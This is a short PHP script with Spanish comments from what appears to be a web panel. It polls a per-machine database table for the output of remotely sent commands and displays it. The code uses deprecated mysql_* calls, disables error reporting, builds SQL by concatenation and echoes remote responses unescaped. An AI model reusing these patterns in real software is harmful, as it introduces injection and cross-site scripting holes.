<?php
header("Cache-Control: no-store, no-cache, must-revalidate");
?>
<?php

//Comprobamos que existe una sesión y tiene la variable conectado, si no, redirige a la página principal
session_start();
if(empty($_SESSION['conectado']))
{
   header ("Location: index.php");
   exit;
}
error_reporting(0);

function filtrar($variable)
{
	return addcslashes(mysql_real_escape_string($variable),',<>');
}
	
if(empty($_SESSION['id_comando']))
{
	$_SESSION['id_comando']='0';
}
else 
{	
	$id=$_SESSION['id_comando'];
	
	//Caso de que se acabe de enviar un comando, y estemos a la espera de recibirlo en la BBDD
	
	if($id>0)
	{
		$maquina=filtrar($_SESSION['maquina']);
		
		include "conexion-bbdd.php";
		$result_a=mysql_query("SELECT respuesta FROM t_" . str_replace(array("."),array("_"),$maquina) . " WHERE finalizado=true AND mostrado=0 AND id_unico_comando=" . $id);
					
		//Si entra es que ya se ha recibido la respuesta a la BBDD, y la almacenaremos en la sesion y pondremos el id del comando a 0 en la sesion
		while($row = mysql_fetch_array($result_a))
		{
			$_SESSION['comandos_anteriores'] = "<br/>" . $row["respuesta"];
			
			$_SESSION['id_comando']=0;
			
			//Indicamos que ya ha sido mostrado para no repetirlo
			$result=mysql_query("UPDATE t_" . str_replace(array("."),array("_"),$maquina) . " SET mostrado=1 WHERE id_unico_comando=" . $id);
			
			echo $_SESSION['comandos_anteriores'];
		}
		include "cerrar-conexion-bbdd.php";
	}
}


?>